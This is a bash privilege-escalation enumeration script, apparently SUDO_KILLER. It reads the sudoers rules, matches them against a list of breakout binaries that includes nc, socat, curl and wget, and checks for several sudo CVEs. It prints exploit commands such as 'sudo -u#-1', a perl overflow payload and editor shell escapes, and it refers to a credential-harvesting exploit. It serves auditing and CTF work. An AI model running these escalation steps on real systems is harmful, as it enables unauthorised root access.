#!/bin/bash
# This script was to developed to check for common misconfigurations and vulnerabilities of the sudo 
# Version="version 2.0.4"
# V1: Date Created : 08/12/2018
# V2: Date Created : 11/02/2020
# Date of last modification : 12/02/2020
# @TH3_ACE - BLAIS David

# Future updates :
# 
#
#

##### (Cosmetic) Colour output
RED="\033[01;31m"      # Issues/Errors
GREEN="\033[01;32m"    # Success
YELLOW="\033[01;33m"   # Warnings/Information
BLUE="\033[01;34m"     # Heading
BOLD="\033[01;01m"     # Highlight
RESET="\033[00m"       # Normal


##### help function
usage () 
{
#####  echo -e " $version \n"
printf " $version \n"
echo -e " Example: ./sudo_killer.sh -c -r report.txt -e /tmp/  \n"

		echo "OPTIONS:"
    echo "-c  Include sudo CVE"
    echo "-i  import (offline mode) from extract.sh"
    echo "-e  Include export of sudo rules / sudoers file"
    echo "-r  Enter report name" 
		echo "-p	path where to save export and report"
		echo "-s 	Supply user password for sudo checks (NOT SECURE)"
#		echo "-t	Include thorough (lengthy) tests"
		echo "-h	Displays this help text"
		echo -e "\n"
		echo "Running with no options = limited scans/no output file"
		
echo -e " ######################################################### "
}


header() 
{


cat << "EOF"
   _____ _    _ _____   ____    _  _______ _      _      ______ _____
  / ____| |  | |  __ \ / __ \  | |/ /_   _| |    | |    |  ____|  __ \
 | (___ | |  | | |  | | |  | | | ' /  | | | |    | |    | |__  | |__) |
  \___ \| |  | | |  | | |  | | |  <   | | | |    | |    |  __| |  _  /
  ____) | |__| | |__| | |__| | | . \ _| |_| |____| |____| |____| | \ \
 |_____/ \____/|_____/ \____/  |_|\_\_____|______|______|______|_|  \_\


EOF

# CANARY
}


function versionToInt() {
  local IFS=.
  parts=($1)
  let val=1000000*parts[0]+1000*parts[1]+parts[2]
  cnver=$val
}

init() {

if [ "$import" ]; then 
sudover=$(cat $import | grep "Sudo version")
else
:  
sudover=`sudo -V 2>/dev/null| grep "Sudo version" 2>/dev/null` 
fi



sudover1=`echo "$sudover" | sed 's/Sudo version //g' | cut -d"p" -f 1` 

# return $cnver 
if [ "$sudover1" ]; then
versionToInt $sudover1
fi

if [ -z "$cnver" ]; then
echo "Error: The tool has not been able to convert the sudo's version!"
fi


if [ "$path" ] ; then
  #mkdir $path 2>/dev/null
  vpath=$path/sudo_killer-export-`date +"%d-%m-%y"`
  #mkdir -p $vpath 2>/dev/null
else 
  :
  echo "$path"
  vpath=/tmp/sudo_killer-export-`date +"%d-%m-%y"`
  #mkdir $vpath 2>/dev/null
fi


} # init

intro()
{

#echo "${BOLD}${YELLOW}[+] Intro ${RESET}" 

who=`whoami` 2>/dev/null 
echo -e "${BLUE} @TH3_ACE - BLAIS David"
echo -e "${BLUE} Contribute and collaborate to the KILLER project @ https://github.com/TH3xACE"
echo -e "${RED} Please consider to give a +1 star on github to show your support! ${RESET}"
echo -e "\n" 
echo -e "${BOLD}${GREEN}[+] Intro ${RESET}" 
echo -e "${BOLD}${YELLOW}Scan started at:${RESET}"; date 
echo -e "\n"
echo -e "Current user: $who"
echo -e "\n" 


if [ "$sudopass" ]; then 
  echo -e "${RED} [+] Please enter password - NOT RECOMMENDED - For CTF use! ${RESET}"
  read -s userpassword
  cmdwp=`echo $userpassword | sudo -S -l -k 2>/dev/null`
else 
  :
fi

if [ "$import" ]; then 
cmd=$(cat $import | grep -v "Sudo version")
else
:  
cmd=$(sudo -S -l -k)
fi

if [ "$report" ]; then 
	echo -e "${BOLD}${YELLOW}[+] Report saved here: ${RESET} $vpath/$report " 
else 
	:
fi

if [ "$exports" ]; then 
	echo -e "${BOLD}${YELLOW}[+] Export location: ${RESET} $vpath/sudo[ers]_export" 
else 
	:
fi

echo -e "\n" 

# PHASE 2
#if [ "$thorough" ]; then 
#	echo "[+] Thorough tests = Enabled" 
#else 
#	echo -e "[+] Thorough tests = Disabled" 
#fi

#sleep 1

}



footer()
{
echo -e "\n ${GREEN} [*##################### SCAN_COMPLETED ##########################*] ${RESET} "
}



checkinitial()
{

echo -e "${BOLD}${YELLOW}================== Initial check - Quick overview ========================= ${RESET} \n"

# useful binaries (thanks to https://gtfobins.github.io/)
binarylist='cp\|nmap\|perl\|awk\|find\|bash\|sh\|man\|more\|less\|vi\|emacs\|vim\|nc\|netcat\|python\|ruby\|lua\|irb\|tar\|zip\|gdb\|pico\|scp\|git\|rvim\|script\|ash\|csh\|curl\|dash\|ed\|env\|expect\|ftp\|sftp\|node\|php\|rpm\|rpmquery\|socat\|strace\|taskset\|tclsh\|telnet\|tftp\|wget\|wish\|zsh\|ssh'


##### sudo version - check to see if there are any known vulnerabilities with this - CVE
#sudover=`sudo -V 2>/dev/null| grep "Sudo version" 2>/dev/null`
if [ "$sudover" ]; then
  echo -e "${BOLD}${GREEN}[+] Sudo version:${RESET}\n$sudover " 
  echo -e "\n"
else 
  :
fi

#pull out vital sudoers info
sudoers=`grep -v -e '^$' /etc/sudoers 2>/dev/null |grep -v "#" 2>/dev/null`
if [ "$sudoers" ]; then
  echo -e "${BOLD}${GREEN}[+] Sudoers configuration exported:${RESET}\n$sudoers"
  echo -e "\n" 

#export sudoers file to export location
if [ "$exports" ] && [ "$sudoers" ]; then
  #mkdir $format/ 2>/dev/null
  #cp /etc/sudoers $format/etc-export/sudoers 2>/dev/null
  cp /etc/sudoers $vpath/sudoers_export.txt 2>/dev/null
else 
  :
fi

else 

if [ "$exports" ] ; then
#sudoers=`echo '' | sudo -S -l -k 2>/dev/null` >> $format/sudoers_export.txt 2>/dev/null
#sudoers="$cmd"
echo "$cmd" > $vpath/sudo_export.txt 2>/dev/null
echo -e "${BOLD}${GREEN}[+] Sudoers configuration exported!${RESET} \n$vpath/sudo_export.txt "
echo -e "\n" 
fi

fi


#can we sudo without supplying a password
#sudoperms=`echo '' | sudo -S -l -k 2>/dev/null`
sudoperms="$cmd"
if [ "$sudoperms" ]; then
  echo -e "${BOLD}${GREEN}[+] SUDO possible without a password!${RESET}\n$sudoperms" 
  echo -e "\n" 
else 
  :
fi

#check sudo perms - authenticated
if [ "$sudopass" ]; then
    if [ "$sudoperms" ]; then
      :
    else
      #sudoauth=`echo $userpassword | sudo -S -l -k 2>/dev/null`
      sudoauth=$cmdwp
      if [ "$sudoauth" ]; then
        echo -e "${BOLD}${GREEN}[+] SUDO possible with a password supplied!${RESET}\n$sudoauth" 
        echo -e "\n" 
      else 
        :
      fi
    fi
else
  :
fi

##known 'good' breakout binaries (cleaned to parse /etc/sudoers for comma separated values) - authenticated
if [ "$sudopass" ]; then
    if [ "$sudoperms" ]; then
      :
    else
      #sudopermscheck=`echo $userpassword | sudo -S -l -k 2>/dev/null | xargs -n 1 2>/dev/null|sed 's/,*$//g' 2>/dev/null | grep -w $binarylist 2>/dev/null`
      sudopermscheck=$(echo $cmdwp | xargs -n 1 2>/dev/null|sed 's/,*$//g' 2>/dev/null | grep -w $binarylist 2>/dev/null)
      if [ "$sudopermscheck" ]; then
        echo -e "${BOLD}${GREEN}[+] Possible sudo pwnage!${RESET}\n$sudopermscheck" 
        echo -e "\n" 
      fi
    fi
fi

#known 'good' breakout binaries (cleaned to parse /etc/sudoers for comma separated values)
#sudopwnage=$(echo "$cmd" | grep "(root) NOPASSWD:" | xargs -n 1 2>/dev/null | sed 's/,*$//g' 2>/dev/null | grep -w $binarylist 2>/dev/null)
sudopwnage=$(echo "$cmd" | xargs -n 1 2>/dev/null | sed 's/,*$//g' 2>/dev/null | grep -w $binarylist 2>/dev/null)
#sudopwnage=`echo '' | sudo -S -l -k 2>/dev/null | xargs -n 1 2>/dev/null | sed 's/,*$//g' 2>/dev/null | grep -w $binarylist 2>/dev/null`
if [ "$sudopwnage" ]; then
  echo -e "${BOLD}${GREEN}[+] Possible sudo pwnage!${RESET}\n$sudopwnage" 
  echo -e "\n" 
else 
  :
fi

#who has sudoed in the past
whohasbeensudo=`find /home -name .sudo_as_admin_successful 2>/dev/null`
if [ "$whohasbeensudo" ]; then
  echo -e "[-] Accounts that have recently used sudo:\n$whohasbeensudo" 
  echo -e "\n"
fi

# Sudo users
sudo_user=$(getent group sudo | cut -d":" -f 4)
if [ "$sudo_user" ]; then
  echo -e "${BOLD}${GREEN}[+] All users found in sudo group: ${RESET}\n$sudo_user" 
  echo -e "\n"
fi 

#check if selinux is enabled
sestatus=`sestatus 2>/dev/null`
if [ "$sestatus" ]; then
  echo -e "[-] SELinux seems to be present: $sestatus, can execute /exploits/CVE-2017-1000367-2.c if vulnerable (Check CVEs)."
  echo -e "\n"
fi

}


checkcve() 
{

  if [ "$sudocve" ]; then
  echo -e "${BOLD}${YELLOW}============= Checking for disclosed vulnerabilities (CVE) =================== ${RESET} \n"

  echo -e "${BOLD}${GREEN}[+] Sudo version vulnerable to the following CVEs:${RESET}"
  sver_tmp=`sudo -V 2>/dev/null| grep "Sudo version" 2>/dev/null | cut -d" " -f 3 2>/dev/null`
  sver=$(echo $sver_tmp | tr -d ' ' | sed 's/P/p/g')
  cat cve.sudo2.txt | grep "$sver_tmp" | cut -d"+" -f 1,2 | awk '{print $0,"\n"}'
  #echo -e "\n"
  
  cve_vuln=`cat cve.sudo2.txt | grep "$(echo $sver)" | cut -d"+" -f 1`
  
  
  if [ "$cve_vuln" ]; then  # Issue 12
  
  while read -r line; do
	#echo "$line"

  # Issue 12 - Improvement
	#cvepath=`ls -al exploits/ | grep "$line" | cut -d " " -f 12`
 cvepath=`ls -al exploits/ | grep "$line" |tr -s " " |cut -d " " -f 9`
	if [ "$cvepath" ]; then
  		echo -e "\n[+] Please find the following exploit for $line in the exploits' directory:"
  		echo -e "[*] Exploit /exploits/$cvepath \n"
	fi
   done <<< "$cve_vuln"

 fi # Issue 12

#cat cve.sudo.txt | while read line
  #do
  #echo $line
  #done
  
  else 
  :
  fi

}


checkmisconfig()
{

echo -e "${BOLD}${YELLOW}============== Checking for Common Misconfiguration ==================== ${RESET} \n"

#sudochownrec=`echo '' | sudo -S -l -k 2>/dev/null | grep "(root) NOPASSWD:" | grep "/bin/chown -hR"`
sudochownrec=$(echo "$cmd" 2>/dev/null | grep "(root) NOPASSWD:" | grep "/bin/chown -hR")
if [ "$sudochownrec" ]; then
  echo -e "${BOLD}${GREEN}[+] Sudo chown with recursive, was found: ${RESET}"
  echo -e "$sudochownrec"
  echo -e "[-] You can change the owner of directories, refer to /notes/chown-hR.txt \n"
  # echo -e "[-] run the command: sudo chown -hR [new_owner:old_owner] [/parent/children] "
  # echo -e "[-] you can then modify or create .sh script that can be run with root right "
  # echo -e "[-] Refer to Possible sudo pwnag! from above "
  # echo -e "[-] #! /bin/bash "
  # echo -e "[-] bash "	
  # echo -e "[-] sudo ./[appp].sh \n"
else
  :
fi

sudochown=$(echo "$cmd" 2>/dev/null | grep "(root) NOPASSWD:" | grep "/bin/chown")
if [ "$sudochown" ]; then
  echo -e "${BOLD}${GREEN}[+] Sudo chown, was found: ${RESET}"
  echo -e "$sudochown"
  echo -e "[-] You can change the owner of directories, refer to /notes/chown-hR.txt \n "
else
  :
fi

sudoimpuser=$(echo "$cmd" 2>/dev/null | grep "(root) NOPASSWD:" | grep -w "/bin/su")
if [ "$sudoimpuser" ]; then
  echo -e "${BOLD}${GREEN}[+] Sudo su, was found: ${RESET}"
  echo -e "$sudoimpuser"
  echo -e "[-] You can impersonate users, by running the cmd: sudo su - [USER] "
  echo -e "[+] Run the tool AGAIN for the impersonated user! \n"
else
  :
fi

#sudonopassuser==`echo '' | sudo -S -l -k 2>/dev/null | grep "NOPASSWD:" | cut -d " " -f 5`

# comment due to issue > Checking sudo without password #9
#sudonopassuser==`echo '' | sudo -S -l -k 2>/dev/null | grep "NOPASSWD:" | grep "/bin\|/sbin"`

sudonopassuser=$(echo "$cmd" 2>/dev/null | grep "NOPASSWD:" | grep -v "root" | sed 's/NOPASSWD//g' | sed 's/(//g' | sed 's/)//g' | sed 's/://g')
if [ "$sudonopassuser" ]; then
echo -e "${BOLD}${GREEN}[+] Sudo without password for other user, was found: ${RESET}"
echo -e "$sudonopassuser"
echo -e "[-] You can impersonate users, by running the cmd: sudo -u [USER] /path/bin"
echo -e "[-] Refer to section [Dangerous bins to escalate to other users] for the exact commands \n"

else
  :
fi

##### CVE-2015-5602
##### The bug was found in sudoedit, which does not check the full path if a wildcard is used twice (e.g. /home/*/*/esc.txt), 
#####  this allows a malicious user to replace the esc.txt real file with a symbolic link to a different location (e.g. /etc/shadow).

if [ "$cnver" -lt "1008015" ] ; then
sudodblwildcard=$(echo "$cmd" 2>/dev/null | grep "(root) NOPASSWD: sudoedit" | grep "/*/*/")
if [ "$sudodblwildcard" ]; then
  echo -e "${BOLD}${GREEN}[+] Sudoedit with double wildcard was found was detected (CVE-2015-5602): ${RESET}" 
  echo -e "$sudodblwildcard"
  echo -e "[-] Vulnerable to CVE-2015-5602 if the sudo version is <=1.8.14"  
  echo -e "[*] Exploit: /exploits/CVE-2015-5602.sh"  
  echo -e "\n" 
#  echo -e "[-] run the command: sudo ./CVE-2015-5602.sh then su [RANDOM PASSWORD GENERATED]\n"  
fi
fi # check version

##### CVE-2019-14287
if [ "$cnver" -lt "1008027" ] ; then
sudorunas=$(echo "$cmd" 2>/dev/null | grep "(ALL, \!root)")
if [ "$sudorunas" ]; then
  cmdi=$(echo "$cmd" 2>/dev/null | grep "(ALL, \!root)" | sed 's/NOPASSWD//g' | sed 's/://g' | cut -d ")" -f 2)
  echo -e "${BOLD}${GREEN}[+] Checking for the vulnerability CVE-2019-14287: ${RESET}"
  echo -e "[-] Vulnerable to CVE-2019-14287 if the sudo version is <=1.8.27"
  echo -e "[-] Example : sudo -u#-1 /usr/bin/id"  
  echo -e "[-] Run command : sudo -u#-1 <cmd>"
  echo -e "[-] where <cmd> is one of the following:"
  echo -e "$cmdi"
  echo -e "[*] Exploit: /exploits/CVE-2019-14287.txt"  
  echo -e "\n" 
fi
fi

##### CVE-2019-18634
if [ "$cnver" -lt "1008026" ] && [ "$cnver" -gt "1007001" ] ; then
sudopwfeedback=$(echo "$cmd" 2>/dev/null | grep " pwfeedback")
if [ "$sudopwfeedback" ]; then
  echo -e "${BOLD}${GREEN}[+] Checking for the vulnerability CVE-2019-18634: ${RESET}"
  echo -e "[-] Vulnerable to CVE-2019-18634 if the sudo version is 1.7.1 to 1.8.25p1 inclusive"
  echo -e "[-] Run command : perl -e 'print(("A" x 100 . "\x{00}") x 50)' | sudo -S id"
  echo -e "[-] if you have a segmentation fault then sudo is vulnerable"
  echo -e "[*] Notes: /exploits/pwfeedback.txt"  
  echo -e "\n" 
fi
fi

# grep '*/\|/*\|*'  or | grep '*/"\|"/*"\|"*''
#sudowildcard=$(echo "$cmd" 2>/dev/null | grep "(root) NOPASSWD:" | grep '*/\|/*\|*' ) 
sudowildcard=$(echo "$cmd" 2>/dev/null | grep "(root) NOPASSWD:" | grep '*' ) 
if [ "$sudowildcard" ]; then
  echo -e "${BOLD}${GREEN}[+] Wildcard was found in the sudoers file: ${RESET}" 
  echo -e "$sudowildcard \n"
fi

sudowildcardsh=$(echo "$cmd" 2>/dev/null | grep "(root) NOPASSWD:" | grep "*" | grep ".sh")
if [ "$sudowildcardsh" ]; then
  echo -e "${BOLD}${GREEN}[+] Wildcard with a bash was found in the sudoers file: ${RESET}"
  echo -e "$sudowildcardsh \n"
fi

echo -e "${BOLD}${YELLOW}================== Checking for File owner hijacking ======================= ${RESET} \n"

#####  Chown file reference trick (file owner hijacking)
sudowildcardchown=$(echo "$cmd" 2>/dev/null | grep "(root) NOPASSWD:" | grep "*" | grep "chown")
if [ "$sudowildcardchown" ]; then
  echo -e "${BOLD}${GREEN}[+] Wildcard with chown was found in the sudoers file: ${RESET} "
  echo -e "$sudowildcardchown"
  echo -e "[-] File owner hijacking possible."
  echo -e "[*] Exploit: /notes/file_owner_hijacking (chown).txt \n"
else
  :
fi

#####  tar file reference trick (file owner hijacking)
sudowildcardtar=$(echo "$cmd" 2>/dev/null | grep "(root) NOPASSWD:" | grep "*" | grep "tar")
if [ "$sudowildcardtar" ]; then
  echo -e "${BOLD}${GREEN}[+] Wildcard with tar was found in the sudoers file: ${RESET}"
  echo -e "$sudowildcardtar"
  echo -e "[-] File owner hijacking possible."
  echo -e "[*] Exploit: /notes/file_owner_hijacking (tar).txt \n"
else
  :
fi

#####  rsync file reference trick (file owner hijacking)
sudowildcardrsync=$(echo "$cmd" 2>/dev/null | grep "(root) NOPASSWD:" | grep "*" | grep "rsync")
if [ "$sudowildcardtar" ]; then
  echo -e "${BOLD}${GREEN} [+] Wildcard with rsync was found in the sudoers file:  ${RESET}"
  echo -e "$sudowildcardrsync"
  echo -e "[-] File owner hijacking possible."
  echo -e "[*] Exploit: /notes/file_owner_hijacking (rsync).txt \n"
else
  :
fi

echo -e "${BOLD}${YELLOW}============= Checking for File permission hijacking ===================== ${RESET} \n"

#####  Chmod file reference trick(file permission hijacking)
sudowildcardchmod=$(echo "$cmd" 2>/dev/null | grep "(root) NOPASSWD:" | grep "*" | grep "chmod")
if [ "$sudowildcardchmod" ]; then
  echo -e "${BOLD}${GREEN} [+] Wildcard with chmod was found in the sudoers file: ${RESET}"
  echo -e "$sudowildcardchmod"
  echo -e "[-] File permission hijacking possible."
  echo -e "[*] Exploit: /notes/file_permission_hijacking.txt \n"
else
  :
fi

  
#####  Check for absolute path to sudoedit
if [ "$cnver" -lt "1008030" ] ; then
sudoeditpathcmd=$(echo "$cmd" 2>/dev/null | grep -E "(/bin/|/usr/bin/|/usr/local/bin/)sudoedit" | cut -d " " -f 8)
sudoeditpath=$(echo "$cmd" 2>/dev/null | grep -Eo "(/bin/|/usr/bin/|/usr/local/bin/)sudoedit")
if [ "$sudoeditpath" ]; then
  echo -e "${BOLD}${GREEN} [+] Absolute path to sudoedit was found in the sudoers file: ${RESET}"
  echo -e "[-] Privilege escalation is possible if the sudo version is < 1.8.30"
  echo -e "[*] Run the command sudo $sudoeditpath <file> to invoke a file editor as root"
  echo -e "[*] where <file> is as below:"
  echo -e "$sudoeditpathcmd"
  echo -e "[-] Once you are in the editor, type the following command in command mode to get a shell"
  echo -e "[-] Run command : :set shell=/bin/sh"
  echo -e "[-] :shell"
  echo -e "[*] Then use the appropriate exploit from /exploits/absolute_path-sudoedit.txt for the editor you invoked \n"
fi
fi
#### check for scripts execution without password in sudoers

echo -e "${BOLD}${YELLOW}=============== Checking for Missing scripts from sudo =================== ${RESET} \n"

# offline mode check
if [ "$import" ]; then 
echo -e "${BOLD}${GREEN}[/] This check is excluded in the offline mode for now. ${RESET}"

else
:
current_user="$(whoami)"

groups > /tmp/groups.txt

# issue #10 > missing check on NOPAASWD
#sudo -S -l -k | grep "NOPASSWD" | sed 's/(root) //g' | sed 's/NOPASSWD: //g' | sed 's/,/\n/g'  | sed -e 's/  *$//' | awk '$1=$1' | cut -d " " -f 1 | grep .sh  > /tmp/script_list
#echo "$cmd" | grep "NOPASSWD" | sed 's/(root) //g' | sed 's/NOPASSWD: //g' | sed 's/,/\n/g'  | sed -e 's/  *$//' | awk '$1=$1' | cut -d " " -f 1 | grep .sh  > /tmp/script_list
echo "$cmd" | sed 's/(root) //g' | sed 's/NOPASSWD: //g' | sed 's/,/\n/g'  | sed -e 's/  *$//' | awk '$1=$1' | cut -d " " -f 1 | grep .sh  > /tmp/script_list
echo -e "${BOLD}${GREEN}[+] The script/s found in sudoers can be found at: /tmp/script_list  ${RESET}"

#### Check for missing scripts that exists in the sudoers file and whether the current user is the owner of directory 
echo -e "[+] Checking whether there are any missing scripts defined in sudoers but that no longer exists on system:"

#echo -e "\n --------------------------------------------------------------"
cat /tmp/script_list | while read line
do

#test
#echo $line

# missing file/script
if [ ! -f $line ]; then

rep=$( echo "$line" | awk -F.sh '{print $1}' | rev | cut -d "/" -f 2,3,4,5,6,7 | rev | cut -d " " -f 2 )


echo -e "\n"
echo -e "------------------------------------------------------------------"
echo -e "[++] Missing script found:"
echo $line
echo -e "\n"

echo -e ">>> Checking Directory User Ownership of the missing script"

#### checking whether the current user is the owner of the directory and his rights
repexist=`echo '' | ls -ld $rep`
direc_user=$( echo "$repexist" | cut -d " " -f 3 )

# r- ls on directory / w- create file / x- access the directory
drights=$( echo "$repexist" | cut -d " " -f 1 )

# checking the owner of the directory is the current user
if [ "$current_user" == "$direc_user" ]
then
echo -e "${BOLD}${GREEN}[+] The current user is the directory owner of the missing file.${RESET}"

#### checking the permission on the directory that the owner/current user has

drightsr=${drights:1:1}
drightsw=${drights:2:1}
drightsx=${drights:3:1}

# echo $drightsr
# echo $drightsw
# echo $drightsx

msgright1="The current user has the right to: "

if [ "$drightsr" == "r" ]
then
msgright1+=" list since r (ls)"
fi

if [ "$drightsw" == "w" ]
then
msgright1+=", access w (cd) "
fi

if [ "$drightsx" == "x" ]
then
msgright1+=" and x create/move file/directory"
fi

#msgright1+=$line

echo -e "[-] $msgright1"
echo -e "[*] Exploit, refer to /notes/owner_direc_missing_file.txt and /notes/Excessive_directory_rights.txt \n"

else
  echo -e "[-] The user $direc_user is the directory owner of the missing file. \n"
fi  # current user

echo -e ">>> Checking Directory Group Ownership of the missing scripts"
# checking whether the current user is part of the group owner of the directory 
direc_grp=$( echo "$repexist" | cut -d " " -f 4 )

cat /tmp/groups.txt | while read line1
do
if [ "$line1" == "$direc_grp" ]
then

echo -e "${BOLD}${GREEN}[+] The current user is in a group that is the directory owner of the missing file.${RESET}"

dgrightsr=${drights:4:1}
dgrightsw=${drights:5:1}
dgrightsx=${drights:6:1}

msgright="The current user is in a group which can "

if [ "$dgrightsr" == "r" ]
then
msgright+="list since r (ls)"
fi

if [ "$dgrightsw" == "w" ]
then
msgright+=", access w (cd) "
fi

if [ "$dgrightsx" == "x" ]
then
msgright+=" and x create/move file/directory. \n"
fi

#msgright+=$line

echo -e "[-] $msgright"
echo -e "[*] Exploit, refer to /notes/owner_direc_missing_file.txt "
#echo -e "-------------------------------------------------------"
break
fi  
done


fi  # check file missing

done  

echo -e "\n"
fi # check offline mode

echo -e "${BOLD}${YELLOW}=============== Checking for Excessive directory right ===================== ${RESET} \n"

# offline mode check
if [ "$import" ]; then 
echo -e "${BOLD}${GREEN}[/] This check is excluded in the offline mode for now. ${RESET}"

else
:

echo -e "${BOLD}${GREEN}[+] The script/s found in sudoers can be found at: /tmp/script_list.txt ${RESET}"

echo -e "-------------------------------------------------------"

cat /tmp/script_list | while read liney
do


####### [DIRECTORY]

# checking the directory rights of the scripts identified in sudo
if [ -f $liney ]; then
rep1=$( echo "$liney" | awk -F.sh '{print $1}' | rev | cut -d "/" -f 2,3,4,5,6,7 | rev | cut -d " " -f 2 )

echo -e "\n"
echo "[++] Checking the directory rights for the script:"
echo "$liney"
echo -e "\n"

echo -e ">>> Checking Directory User Ownership of the scripts"

#### checking whether the current user is the owner of the directory and his rights
repexist1=`echo '' | ls -ld $rep1`
direc_user1=$( echo "$repexist1" | cut -d " " -f 3 )

# r- ls on directory / w- create file / x- access the directory
drights1=$( echo "$repexist1" | cut -d " " -f 1 )

# checking the owner of the directory is the current user
if [ "$current_user" == "$direc_user1" ]
then
  echo -e "${BOLD}${GREEN}[+] The current user is the directory owner of the script.${RESET}"

#### checking the permission on the directory that the owner/current user has

drightsr1=${drights1:1:1}
drightsw1=${drights1:2:1}
drightsx1=${drights1:3:1}

msgright2="The current user has the right to: "

if [ "$drightsr1" == "r" ]
then
msgright2+=" list since r (ls)"
fi

if [ "$drightsw1" == "w" ]
then
msgright2+=", access w (cd) "
fi

if [ "$drightsx1" == "x" ]
then
msgright2+="and x create/move file/directory "
fi
#msgright2+="for the script : \n"
#msgright2+=$liney

echo -e "[-] $msgright2"
echo -e "[*] Exploit, refer to /notes/Excessive_directory_rights.txt \n"

else
  echo -e "[-] The user $direc_user1 is the directory owner of the missing file. \n"
fi  # current user


echo -e ">>> Checking Directory Group Ownership of the scripts"
# checking whether the current user is part of the group owner of the directory 
direc_grp1=$( echo "$repexist1" | cut -d " " -f 4 )

cat /tmp/groups.txt | while read linet
do
if [ "$linet" == "$direc_grp1" ]
then

echo -e "${BOLD}${GREEN}[+] The current user is in a group that is the directory owner of the script.${RESET}"

dgrightsr1=${drights1:4:1}
dgrightsw1=${drights1:5:1}
dgrightsx1=${drights1:6:1}

msgright3="The current user is in a group which can "

if [ "$dgrightsr1" == "r" ]
then
msgright3+="list since r (ls)"
fi

if [ "$dgrightsw1" == "w" ]
then
msgright3+=", access w (cd) "
fi

if [ "$dgrightsx1" == "x" ]
then
msgright3+=" and x create/move file/directory. "
fi

#msgright3+=$liney

echo -e "[-] $msgright3"
echo -e "[*] Exploit, refer to /notes/Excessive_directory_rights.txt \n"
break
fi  
done

echo -e " \n ------------------------------------------------"

fi


done
# clear the scripts list
# rm /tmp/sh_list.txt

fi # offline mode check


echo -e "${BOLD}${YELLOW}============= Checking for Writable scripts within sudo  ==================== ${RESET} \n"

# offline mode check
if [ "$import" ]; then 
echo -e "${BOLD}${GREEN}[/] This check is excluded in the offline mode for now. ${RESET}"

else
:

####### [FILE]

##### Check for writable scripts by current users from the sudoers file 

#current_user="$(whoami)"
#current_groups="$(groups)"

#groups > /tmp/groups.txt

#sudo -S -l -k | grep .sh | sed 's/(root) //g' | sed 's/NOPASSWD: //g' | sed 's/,/\n/g' |  tr -d " \t\r" | grep ".sh" > /tmp/sh_list.txt



cat /tmp/script_list | while read linex
do

# if script exist
if [[ -f ${linex} ]]; then

# owner of each file/script
owner_file=`echo '' | ls -l $linex | cut -d " " -f 3 2>/dev/null` 

shperms=$( ls -l "$linex" )

if [ "$current_user" == "$owner_file" ]
then

echo -e ">>> Checking current user permission on the scripts owned by him \n"
echo -e "Checking the following script: $linex"
#echo -e "\n"

msgfp="The current user can "

#shperms=$( ls -l "$linex" )
#perm_user=$( echo "$shperms" | cut -d "-" -f 2 )

frightsr=${shperms:1:1}
frightsw=${shperms:2:1}
frightsx=${shperms:3:1}

if [[ $frightsr = "r" ]]
then
  msgfp+="read the file (r), "

fi # perms

if [[ $frightsw = "w" ]]
then
  msgfp+="modify the file (w), "

fi # perms

if [[ $frightsx = "x" ]]
then
  msgfp+="and can execute the file (x)"

fi # perms

 msgfp+=" for the script $linex"

echo -e "${BOLD}${GREEN}[+] $msgfp${RESET} \n"

# clear var
owner_file="nothing"

fi # user owner check 

#############################################################

# checking whether the current user is part of the group owner of the directory 
direc_grp1=$( echo "$shperms" | cut -d " " -f 4 )

#echo $shperms
#echo $direc_grp1


cat /tmp/groups.txt | while read line2
do
if [ "$line2" == "$direc_grp1" ]
then
echo -e ">>> Checking current user group ownership of the script \n"
#echo -e ">>> Checking current user group permission on file \n"
echo -e "${BOLD}${GREEN}[-] The current user is part of a group or several groups that is the owner of the script, the groups are: $line2${RESET}"
#echo -e "[-] The current user is in a group that is the file owner of the script."
# echo -e "[+] Exploit, refer to /notes/owner_direc_missing_file.txt "

# drightsgrp=${drights:5:3}

fgrightsr=${shperms:4:1}
fgrightsw=${shperms:5:1}
fgrightsx=${shperms:6:1}


msgfgright="The current user can "

if [ "$fgrightsr" == "r" ]
then
msgfgright+="read the file (r), "
fi

if [ "$fgrightsw" == "w" ]
then
msgfgright+="modify the file (w), "
fi

if [ "$fgrightsx" == "x" ]
then
msgfgright+="and can execute the file (x). "
fi

msgfgright+=$linex

direc_grp1="nothing"

#if [[ $drightsgrp = "rwx" ]]
#  then
#    echo -e "[-] $drightsgrp > The current user is in a group which can list if r (ls), access w (cd) and x create/move file/directory in the directory $line."
echo -e "[+] $msgfgright"
echo -e "[*] Exploit, refer to /notes/owner_direc_missing_file.txt \n"
#fi # permission
# break
fi  # group owner check
done

fi # exists

done 

fi # offline mode check

echo -e "${BOLD}${YELLOW}================= Checking for Credential Harvesting ======================== ${RESET} \n"

# offline mode check
if [ "$import" ]; then 
echo -e "${BOLD}${GREEN}[/] This check is excluded in the offline mode for now. ${RESET}"

else
:

echo "Current User: $current_user"
current_user="$(whoami)"
#echo $current_user

#hdir=`echo "" | ls -ld /home/*`
#echo "$hdir"
hdir=`echo "" | ls -al /home/*/.bashrc`
#echo "$hdir"

while read -r line; do

current=$line
wo=${current:2:1}
wg=${current:5:1}
wa=${current:8:1}

dir_user=$( echo "$current" | cut -d " " -f 3 )
#echo $dir_user

if [ "$current_user" == "$dir_user" ]
then
#echo $wo
#echo $wa

if [ "$wo" == "w" ]
then
# echo "Current user is the owner and can write the bashrc file"     
echo -e "${BOLD}${GREEN}[+] Vulnerable to Creds Harvesting. ${RESET}"
echo "[*] Exploit, refer to the exploit /exploits/credHarvest.sh"
fi

if [ "$wa" == "w" ]
then
# echo "Current user can write the bashrc file"
echo -e "${BOLD}${GREEN}[+] Vulnerable to Creds Harvesting. ${RESET}"
echo "[*] Exploit, refer to the exploit /exploits/credHarvest.sh"
fi

# echo $line
fi # check owner
done <<< "$hdir"

echo -e "\n"

#rm /tmp/sh_list1.txt

fi # offline mode check

}


checkdangenvar()
{


##### Check for dangerous environment variables
echo -e "${BOLD}${YELLOW}============ Checking for Dangerous environment variables ================== ${RESET} \n"


# check for env_reset being disabled 
sudoenv=$(echo "$cmd" 2>/dev/null | grep "\!env\_reset")  
if [ "$sudoenv" ]; then

#sudover1=`echo "$sudover" | sed 's/Sudo version //g'`
#if [ "$sudover1" ]; then
#versionToInt $sudover1

#if [ "$cnver" -lt "1008025" ] ; then
if [ "$cnver" -lt "1008005" ] && [ "$cnver" -gt "1006009" ] ; then
echo -e "${BOLD}${GREEN}[+] env_reset being disabled, This means we can manipulate the environment of the command we are allowed to run (depending on sudo version).${RESET}"
echo -e "${BOLD}${GREEN}[+] Since the sudo version is > 1.6.9 and < 1.8.5, the environment variables are not removed and it is probably vulnerable to the CVE-2014-0106 ${RESET}" 
echo -e "[-] Exploit for the CVE:  /exploits/CVE-2014-0106.txt \n"

fi

fi


